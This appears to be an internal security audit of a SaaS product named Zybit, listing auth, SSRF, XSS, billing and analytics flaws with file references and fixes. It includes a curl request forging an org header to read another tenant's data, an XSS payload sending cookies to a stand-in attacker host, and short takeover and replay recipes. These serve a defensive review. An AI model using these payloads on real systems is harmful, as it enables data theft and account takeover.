## The three things that actually end the company

### 1. You're inventing the numbers in your own audit reports — in direct violation of your own doctrine.

`DOCTRINE.md` line 122, verbatim: *"a tool that invents numbers or generates evidence from thin air"* is something Zybit explicitly is not. Open `lighthouse/lib/runner/runUrlAudit.ts:140-152`. It calls `generateGroundedEvents()` — **synthetic events** — and feeds them into `impactEstimate.ts:64-79`, which multiplies `affectedRate × dailyVolume × baselineConv × ARPU × 30` and ships the result to a prospect's inbox as `~$3.2k/month`. You noticed enough to suppress `rage-click-target` (`run/route.ts:251`), but every other rule still launders synthetic input through real-looking math. A PM reads the methodology footnote, traces the dollar number to invented session counts, and you lose the deal AND your reputation in the same call. This is not a roadmap item. This is fraud-adjacent and you ship it Day 0 to every prospect. **Fix today.**

### 2. Your "invite-only" auth model is not invite-only.

`src/app/api/audit/public/confirm/route.ts:154-193` — when someone confirms a public audit, you `INSERT INTO app_users (status='approved', role='admin')`. The only gate is a 31-entry denylist of consumer email domains (`personalEmailDomains.ts`). Register `attacker-co.io` on Fastmail-for-Domains for $5, submit `/audit` for `stripe.com`, click the confirm link, and you're now an admin on an organization literally named `stripe.com`. Then the report email hands you a HMAC-signed magic-link CTA via `/api/auth/request-link-from-audit` that bypasses the invite gate entirely (because `status='approved'` already). **A public open-signup route shipped as a lead magnet.** The invite-only invariant is fiction.

### 3. `x-org-id` header is a multi-tenant data leak by default.

`src/app/api/phase1/_shared.ts:130` — `getOrgIdentityMode()` defaults to `'dev'`. In `'dev'` mode, an unauthenticated request with `x-org-id: <any-uuid>` is accepted verbatim as the org context, all the way through `actor.ts:90-101`. Unless `PHASE1_ORG_IDENTITY_MODE=header_required` is explicitly set in Vercel prod, `curl https://getzybit.com/api/dashboard/findings -H 'x-org-id: <victim>'` reads any customer's findings, snapshots, integrations, and AI-suggest history. Go check Vercel right now.

## Eight code bombs waiting for the first real customer

**13. Auto-provision CTE creates orphan organizations.** `confirm/route.ts:175` — `ON CONFLICT (email) DO NOTHING` on the user no-ops while the org INSERT **still commits** (Postgres CTE inserts don't roll back when the consumer skips). Every confirmed audit from an existing email leaks an orphan `stripe.com`-named org. Concurrent confirms by the same email race into the CTE and both create orgs. Compounds with #2.

**14. SSRF via Browserless.** `run/route.ts:288` calls `captureAuditScreenshot(audit.url)` and the URL never goes back through `validatePublicUrl`. Browserless follows 302s to `169.254.169.254`. The screenshot lands in a **public** Vercel Blob, the URL goes in the email. AWS metadata creds end up in a prospect's inbox.

**15. `ADMIN_PASSWORD` is the HMAC signing key for admin session cookies.** `adminSession.ts:8-19`. Local `.env` shows `ADMIN_PASSWORD=localadmin`. If prod is anything memorable, one leaked cookie = offline-brute the password. AND `/api/admin/login` has no rate limit — direct brute is also on the table.

**16. PM dashboard can author XSS on customer sites.** `htmlModifier.ts:42-45` — the strict AI-advisor allowlist (`isSafeAttributeName`, `isSafeReplacementText`) is **only applied to AI-suggested modifications, not human-PATCHed ones**. A compromised PM account (or a malicious internal user) PATCHes an experiment with `{ type: 'attribute-set', selector: 'body', attr: 'onload', value: 'fetch("//attacker?"+document.cookie)' }` and the proxy serves it to every visitor on the customer's site.

**17. Stripe webhook has no `event.id` dedup** (`billing/webhook/route.ts:44`). A replay of a stale `checkout.session.completed` rewinds a downgrade back to a paid plan. Free upgrade attack, one replay away.

**18. Bucket cookie persists across experiment relaunches** (`proxy/handler.ts:48-52`). Stop and restart the same experiment ID, and existing visitors stay in their old bucket. Control/variant split corrupted, statistical claims invalid.

**19. Conversion join doesn't scope by `targetPath`** (`computeOutcomes.ts:111-119`). A visitor assigned on `/pricing` who later clicks any CTA anywhere on the site counts as a conversion. Click-class experiments are silently inflated.

**20. `ruleCalibration.ts:150` has no NaN guard.** One corrupt outcome row → NaN multiplier → all thresholds become NaN → rules silently stop firing for that site. The PM sees "no findings this week" and Zybit looks dead.

## P1 findings worth fixing this month

- **Magic-link rate limit bypassable via `X-Forwarded-For` rotation** (`rateLimit.ts`). Burn through Resend reputation in one script. Prefer `x-vercel-forwarded-for` on Vercel; normalize plus-addressing before keying.
- **`request-link-from-audit` HMAC is replayable for 30 days** (`cookies.ts:58`). No single-use stamp. Email-bomb tool against any audit recipient.
- **Audit-confirm is a GET that mutates state.** Outlook/Slack/antivirus link-prefetchers consume the token + auto-provision before any human clicks. Combine with #2 and mail prefetchers are silently creating orgs. Move to POST-from-interstitial.
- **Public-audit rate limit + $25/day budget gate are non-atomic** ("peek then increment", admitted at `publicAuditRateLimit.ts:125`). 50 parallel submits all pass. One attacker burns the daily budget in a minute.
- **Proxy forwards origin `Set-Cookie` to `*.zybit.run` before customer activates CNAME** (`proxy/handler.ts:179`) — session-fixation window.
- **`/api/proxy/assignment` is unauth POST.** Anyone can spam fake `experiment_assignment` events into any customer's site, polluting outcome computation. HMAC the body or restrict by origin.
- **Snapshot routes (`POST /api/phase2/sites/[siteId]/snapshots`) don't run user-supplied `baseUrl` through the SSRF validator** — authenticated users can hit `169.254.169.254` via the snapshot path.
- **Flow-graph collapses all null-session events into one mega-session** (`deriveFlowGraph.ts:50`). Massive fake edges.
- **Plan-limit enforcement explodes at the wrong layer.** `updateExperimentStatusAction` (`actions.ts:17-100`) launches draft → running without calling `checkPlanLimit('experiments')`. Only the API route checks. PMs blow past the cap via the UI.
- **The `/audit/[id]` `signupLink` only appears for the cookie-bound original requester** (`status/route.ts:125`). Anyone who forwards the audit URL sees stripped findings. The boss is the buyer. Loss of viral surface.
